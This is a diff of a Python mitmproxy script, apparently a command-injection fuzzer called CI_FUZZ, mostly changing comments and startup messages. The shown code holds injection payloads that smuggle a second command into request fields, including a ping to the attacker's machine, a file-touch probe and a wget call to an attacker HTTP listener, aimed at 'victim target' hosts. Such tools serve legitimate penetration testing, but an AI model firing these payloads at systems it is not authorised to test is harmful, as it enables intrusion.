@@ -9,20 +9,20 @@ CI_FUZZ     v.2018-Jan-31
                                                 
 '''
 
-from mitmproxy import http    	#Request/Response intercepting
+from mitmproxy import http    #Request/Response intercepting
 from mitmproxy import ctx    	#Logging to builtin events
-import json      		#For json manipulation
-import re			#For regex
-from time import sleep		#for delay between replays
-import socket			#For attacker IP
-import os			#For ensuring run within mitmproxy (for pid)
-import subprocess		#For ensuring run within mitmproxy (for process name)
-import sys			#For ensuring run within mitmproxy (to exit if incorrect)
+import json      		         #For json manipulation
+import re			            #Regex changes
+from time import sleep		   #Adds delay between replays
+import socket			         #Gather attacker IP
+import os			            #Startup check - ensuring run within mitmproxy (for pid)
+import subprocess		         #Startup check - ensuring run within mitmproxy (for process name)
+import sys			            #Startup check - ensuring run within mitmproxy (to exit if incorrect)
 
 ##############################################
 #BEGIN CONFIGURATION SECTION
-#set the IP/hostname to fuzz.  If the IP address is not listed below - ci_fuzz.py will skip it.
-host_allow = ["192.168.1.171","127.0.0.1"]  #Set what HOSTs we want to fuzz on (ip or hostname only)
+#Must Configure the IP/hostname to fuzz.  (If the IP address is not listed below - ci_fuzz.py will skip it)
+host_allow = ["192.168.1.171","127.0.0.1"]  #MUST set what HOSTs we want to fuzz on (ip or hostname only)
 
 #Optional Configuration
 payload = ";ping -s 14 -c 1 -p "  #Don't forget to run python icmp.py separately to listen for pings on attacker's IP!!
@@ -43,11 +43,11 @@ running_from = subprocess.run(['ps', '-p', str(os.getpid()) ], stdout=subprocess
 if re.match('.*mitm*.', str(running_from)):
     ctx.log.error("Starting CI_FUZZ......")
 else:
-    print("usage error: ci_fuzz.py  MUST be run as a script for mitmweb(mitmproxy)")
+    print("Usage error: ci_fuzz.py  MUST be run as a script from mitmweb(mitmproxy)")
     print("Example usage ====> mitmweb --listen-port 7777 --ssl-insecure -s ./ci_fuzz/ci_fuzz.py")
     sys.exit()
+ctx.log.error("****VICTIM TARGET hosts must be below to fuzz!!!****")
 ctx.log.error("Fuzzing on hosts->%s with HTTP-type(s) of->%s" % (host_allow,method_type))
-ctx.log.error("****VICTIM TARGET IP must be above ^^^^^ to fuzz!!!****")
 #END Basic Startup Checks
 ###############################################
 
@@ -255,6 +255,8 @@ except KeyboardInterrupt:
 #payload = ";touch /tmp/ci_fuzz.txt"  #Don't forget to watch for new files in the victim's directory!! (ie: watch ls /tmp/ci_fuzz.txt)
 #payload = ";wget 10.10.10.10:80/ci_fuzz --no-proxy&"   #Don't forget to setup an http listener on attacker's IP!! (ie: python -m SimpleHTTPServer 80)
 #payload - "<script>alert('xss')</script>"   #tool not designed for this - not likely
+
+#3)Combine 3 send_modified_string_request, send_modified_list_request, send_modified_dict_request into single function if possible
 
 #END Unused/Development/TODO Functions.
 ###############################################
